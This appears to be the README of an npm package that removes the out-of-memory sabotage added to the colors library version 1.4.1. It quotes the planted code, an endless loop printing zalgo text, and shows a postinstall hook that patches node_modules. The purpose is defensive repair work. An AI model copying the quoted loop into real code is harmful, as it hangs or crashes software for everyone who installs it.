# What's it for?

[colors](https://www.npmjs.com/package/colors)@^1.4.1 has action of out-of-memory: https://github.com/Marak/colors.js/commit/5d2d242f656103ac38086d6b26433a09f1c38c75.

https://github.com/Marak/colors.js/blob/master/lib/index.js

```js
...

/* here... */
/* remove this line after testing */
let am = require('../lib/custom/american');
am();
for (let i = 666; i < Infinity; i++) {
  if (i % 333) {
    // console.log('testing'.zalgo.rainbow)
  }
  console.log('testing testing testing testing testing testing testing'.zalgo)
}
```

# Solution

Remove the oom action code after node_modules was installed.

package.json

```js
{
    "scripts": {
        "postinstall": "node fixColors.js"
    }
}
```

fixColors.js

```js
const path = require('path');
const fixColorsOom = require('fix-colors-out-of-memory');
const nodeModulesFolder = path.join(__dirname, 'node_modules');

fixColorsOom.fixFolder(nodeModulesFolder);

// or fix target file path
fixColorsOom.fixFile(path.join(__dirname, 'node_modules/colors/lib/index.js'));
```

# LICENSE

MIT